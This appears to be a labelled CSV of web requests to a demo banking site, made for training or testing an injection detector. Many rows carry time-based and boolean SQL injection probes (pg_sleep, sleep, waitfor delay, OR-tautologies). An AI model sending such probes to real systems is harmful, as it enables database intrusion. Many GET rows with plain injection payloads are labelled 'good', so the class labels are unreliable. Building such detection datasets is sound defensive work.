method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,,/index.jsp?content=-1%20OR%203%2B830-830-1=0%2B0%2B0%2B1&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=-1%20OR%203%2B596-596-1=0%2B0%2B0%2B1,/doSubscribe,0,0,0,0,2,0,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util,0,0,0,0,0,0,good
GET,,/index.jsp?content=1%00%C0%A7%C0%A2%252527%252522&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=ePuZoGKH';select%20pg_sleep(14);%20--%20&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=if(now()=sysdate()%2Csleep(9)%2C0)&template=US,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=if(now()=sysdate()%2Csleep(11)%2C0),0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=1%00%C0%A7%C0%A2%252527%252522,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=dvi6sT0u';select%20pg_sleep(11);%20--%20,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=JyI=&subject=1,/sendFeedback,0,0,0,0,2,0,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=DKrgDEBp');select%20pg_sleep(6);%20--%20,/sendFeedback,2,0,2,2,5,4,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=333'&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=-1""%20OR%203%2B762-762-1=0%2B0%2B0%2B1%20--%20&template=US",0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0""XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR""Z&subject=1",/sendFeedback,0,4,0,10,2,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,-1%20OR%202%2B308-308-1=0%2B0%2B0%2B1&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm%25'%20AND%202*3*8=6*8%20AND%20'U3ND'!='U3ND%25&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1'%20OR%202%2B434-434-1=0%2B0%2B0%2B1%20or%20'Qa8ZHG8v'=',/sendFeedback,8,0,0,0,6,0,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,-1'%20OR%202%2B575-575-1=0%2B0%2B0%2B1%20or%20'dzbap5yz'='&txtEmail=sample%40email.tst,/doSubscribe,8,0,0,0,4,0,bad
POST,submit=%20Submit%20&cfile=b48bPz0B'));select%20pg_sleep(7);%20--%20&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,5,4,bad
POST,btnSubmit=Subscribe&txtEmail=sample%40email.tst,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,1%20waitfor%20delay%20'0:0:11.658'%20--%20&passw=g00dPa%24%24w0rD&uid=1,/doLogin,4,0,2,0,5,6,bad
GET,,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2B467-467-1=0%2B0%2B0%2B1%20or%20'bQPnwYwu'=',0,0,0,0,0,0,good
POST,%40%40dEus6&passw=g00dPa%24%24w0rD&uid=e,/doLogin,0,0,0,0,0,2,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1""%20OR%202%2B847-847-1=0%2B0%2B0%2B1%20--%20&subject=1",/sendFeedback,0,2,2,0,6,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=%F0''%F0""""&name=zFPWdwPk&subject=1",/sendFeedback,4,4,0,0,2,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1%20waitfor%20delay%20'0:0:6'%20--%20,/sendFeedback,4,0,2,0,7,4,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=1'""&job=CustomerServiceRepresentative:CustomerService",0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,"btnSubmit=Subscribe&txtEmail=sample%40email.tst""%20AND%202*3*8=6*8%20AND%20""oymQ""=""oymQ",/doSubscribe,0,8,0,0,4,0,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,"%BF'%BF""&txtEmail=sample%40email.tst",/doSubscribe,2,2,0,0,0,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI=,/doLogin,0,0,0,0,0,2,bad
GET,,/index.jsp?content=inside_jobs.htm&job=wsMiaEdf');select%20pg_sleep(0);%20--%20,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,"0""XOR(if(now()=sysdate()%2Csleep(29.62)%2C0))XOR""Z&passw=g00dPa%24%24w0rD&uid=e",/doLogin,0,4,0,10,0,4,bad
POST,btnSubmit=Subscribe&txtEmail=JyI=,/doSubscribe,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%BF'%BF""&job=CustomerServiceRepresentative:CustomerService",0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm&job=-1""%20OR%203%2B534-534-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=1%00%C0%A7%C0%A2%252527%252522&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=1%00%C0%A7%C0%A2%252527%252522,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,McPwsr2w');select%20pg_sleep(4);%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,3,4,bad
GET,,/inside_points_of_interest.htm,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%202%2B27-27-1=0%2B0%2B0%2B1%20or%20'kQWwwMxI'='&uid=1,/doLogin,8,0,0,0,4,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%40%40ZI4Oc&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%BF'%BF""&subject=1",/sendFeedback,2,2,0,0,2,0,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=%40%40729VP,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=security.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Irozsg2B');select%20pg_sleep(9);%20--%20&template=US,0,0,0,0,0,0,good
GET,,/swagger/,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=-1%20OR%202%2B176-176-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=HW4WCMPw');select%20pg_sleep(21);%20--%20&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/Privacypolicy.jsp?sec=-1'%20OR%202%2B299-299-1=0%2B0%2B0%2B1%20--%20&template=US,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,"/util/serverStatusCheckService.jsp?HostName=%F0''%F0""""",0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2B246-246-1=0%2B0%2B0%2B1%20--%20&subject=1,/sendFeedback,0,0,2,0,6,0,bad
GET,,/index.jsp?content=inside_jobs.htm&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=cwAKe864';%20waitfor%20delay%20'0:0:6'%20--%20,/sendFeedback,6,0,2,0,7,4,bad
GET,,/index.jsp?content=business.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/favicon.ico,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=0""XOR(if(now()=sysdate()%2Csleep(21)%2C0))XOR""Z&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,0,4,0,10,2,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=%40%40JO8bR&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,-1%20OR%202%2B660-660-1=0%2B0%2B0%2B1%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,0,4,0,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,"/default.jsp?content=-1""%20OR%203*2<(0%2B5%2B176-176)%20--%20",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,1%00%C0%A7%C0%A2%252527%252522&passw=g00dPa%24%24w0rD&uid=e,/doLogin,0,0,0,0,0,2,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=e,/doLogin,0,0,0,0,0,2,bad
GET,,/Privacypolicy.jsp?sec=-1'%20OR%202%2B464-464-1=0%2B0%2B0%2B1%20or%20'NQuZ109B'='&template=US,0,0,0,0,0,0,good
POST,"0""XOR(if(now()=sysdate()%2Csleep(4)%2C0))XOR""Z&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,0,4,0,10,0,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm%25'%20AND%202*3*8=6*8%20AND%20'9jsm'!='9jsm%25&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,"%BF'%BF""&passw=g00dPa%24%24w0rD&uid=1",/doLogin,2,2,0,0,0,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,6T56NOZz'));select%20pg_sleep(34.974);%20--%20&passw=g00dPa%24%24w0rD&uid=1,/doLogin,2,0,2,2,3,6,bad
GET,,/index.jsp?content=pr/20060928.htm,0,0,0,0,0,0,good
POST,JyI=&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,"/search.jsp?query=1'""",0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,%5C&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=JyI=&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=1%00%C0%A7%C0%A2%252527%252522&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=-1'%20OR%202%2B808-808-1=0%2B0%2B0%2B1%20--%20&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,0,6,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=GFOLajui,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5C,/doLogin,0,0,0,0,0,2,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,"(select(0)from(select(sleep(4)))v)/*'%2B(select(0)from(select(sleep(4)))v)%2B'""%2B(select(0)from(select(sleep(4)))v)%2B""*/&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,4,4,0,30,0,18,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,4,0,2,0,7,4,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=-1'%20OR%202%2B634-634-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=%BF'%BF""&template=US",0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1'""",/sendFeedback,2,2,0,0,2,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=gHveLU2k';select%20pg_sleep(6);%20--%20,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=business_insurance.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,-1%20OR%202%2B169-169-1=0%2B0%2B0%2B1%20--%20&passw=g00dPa%24%24w0rD&uid=1,/doLogin,0,0,2,0,4,2,bad
GET,,"/index.jsp?content=1'""&job=Teller:ConsumaerBanking",0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=0""XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR""Z&job=CustomerServiceRepresentative:CustomerService",0,0,0,0,0,0,good
POST,0'XOR(if(now()=sysdate()%2Csleep(13)%2C0))XOR'Z&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,4,0,0,10,0,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=MaYH0HJD&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=0""XOR(if(now()=sysdate()%2Csleep(14)%2C0))XOR""Z&job=MortgageLendingAccountExecutive:Sales",0,0,0,0,0,0,good
GET,,"/index.jsp?content=1'""&job=ExecutiveAssistant:Administration",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_internships.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=fVSIKM56');select%20pg_sleep(3);%20--%20,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,%5C&passw=g00dPa%24%24w0rD&uid=e,/doLogin,0,0,0,0,0,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp?content=%40%40FKvMP,0,0,0,0,0,0,good
GET,,/admin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=US,0,0,0,0,0,0,good
POST,JyI=&passw=g00dPa%24%24w0rD&uid=e,/doLogin,0,0,0,0,0,2,bad
POST,-1'%20OR%202%2B452-452-1=0%2B0%2B0%2B1%20--%20&passw=g00dPa%24%24w0rD&uid=1,/doLogin,2,0,2,0,4,2,bad
GET,,/5%B3%A1%E0%C79%F5/sM%BB3%0F%9A%B5%15%EEk4%9A6%FF%C4%AF%FB%F3%A7K%EC_%F9G%AEp%8F]r%60%CF%C7%C0Kb%FE%E7%EERC%FB,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=%40%40PF0A3&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/index.jsp?content=inside_jobs.htm&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/my%20documents,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=JyI=,0,0,0,0,0,0,good
GET,,"/index.jsp?content=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/&job=CustomerServiceRepresentative:CustomerService",0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=1'""&uid=e",/doLogin,2,2,0,0,0,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp?query=1,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
